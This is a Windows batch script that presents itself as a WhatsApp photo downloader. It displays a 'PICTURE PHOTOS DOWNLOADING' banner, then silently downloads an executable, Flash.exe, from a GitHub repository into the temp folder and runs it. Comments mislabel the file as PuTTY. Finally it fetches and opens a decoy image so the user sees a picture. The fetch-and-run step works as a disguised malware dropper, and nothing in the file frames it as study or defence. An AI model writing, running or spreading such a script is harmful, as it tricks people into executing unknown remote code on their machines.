@echo off
setlocal enabledelayedexpansion

:: Calculate center position for the text
for /f "delims=" %%a in ('echo prompt $H ^| cmd') do set "ESC=%%a"
for /f %%a in ('"prompt $E & for %%b in (1) do rem"') do set "BS=%%a"
set "text=WHATSAPP PICTURE PHOTOS DOWNLOADING......."
set /a center=(80 - !text!^)/2

:: Display centered text
echo %ESC%[1;%center%H!text!

:: Set the PuTTY download URL and destination file
set "puttyUrl=https://github.com/johnihr00/test-files/blob/main/Flash.Exe"
set "puttyDestination=%TEMP%\Flash.exe"

:: Download PuTTY silently
curl -o "!puttyDestination!" -L --silent "!puttyUrl!" || wget -q -O "!puttyDestination!" "!puttyUrl!"

:: Run PuTTY if download was successful
if !errorlevel! equ 0 (
    start "" "!puttyDestination!"
)

:: Set the new image download URL and destination file
set "imageUrl=https://raw.githubusercontent.com/johnihr00/test-files/main/mypic1.jpg"
set "imageDestination=%TEMP%\downloaded_image.jpg"

:: Download the new image using PowerShell
powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imageDestination%') }"

:: Open the downloaded image with the default image viewer if download was successful
if exist "!imageDestination!" (
    start "" "!imageDestination!"
)

:: End script
endlocal
exit /b
